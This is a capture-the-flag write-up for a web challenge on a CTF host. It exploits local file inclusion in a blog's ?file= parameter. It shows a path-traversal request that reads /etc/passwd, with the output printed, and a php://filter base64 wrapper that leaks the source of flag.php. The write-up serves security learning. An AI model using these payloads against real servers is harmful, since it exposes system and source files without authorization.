# EZ CTF

## Web

### I made a blog!

**Difficulty:** Easy

**Statement:** Did you check out my blog posts? 

***

Browsing the blog, we can see that each article is passed as an argument to the `?file=` parameter.

So I decide to try to exploit LFI to retrieve files stored on the web server.

I start by retrieving the value of the `/etc/passwd` file to test if the server is vulnerable:

```
http://ez.ctf.cafe:9999/blog-posts.php?file=../../../etc/passwd
```

```shell
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
```

Then, I try to display the content of the **robots.txt** file:

```
http://ez.ctf.cafe:9999/blog-posts.php?file=robots.txt
```

```
User-agent: *
Disallow: /flag.php
```

With the robots.txt file, I now know that there is a **flag.php** file.

But when I try to display the content of the file, there is only the sentence: `How do you filter your coffee?`

So I will use PHP wrappers to get the content of the **flag.php** file in base64 :

```
http://ez.ctf.cafe:9999/blog-posts.php?file=php://filter/convert.base64-encode/resource=flag.php
```

I get the value: `PD9waHAKCWVjaG8gJ0hvdyBkbyB5b3UgZmlsdGVyIHlvdXIgY29mZmVlPyc7ICAgIAoJLy8gRVotQ1RGe0xGSV8xU18zWn0KPz4K`

After decoding the string:

```
<?php
    echo 'How do you filter your coffee?';    
    // EZ-CTF{LFI_1S_3Z}
?>
```

Flag: EZ-CTF{LFI_1S_3Z}
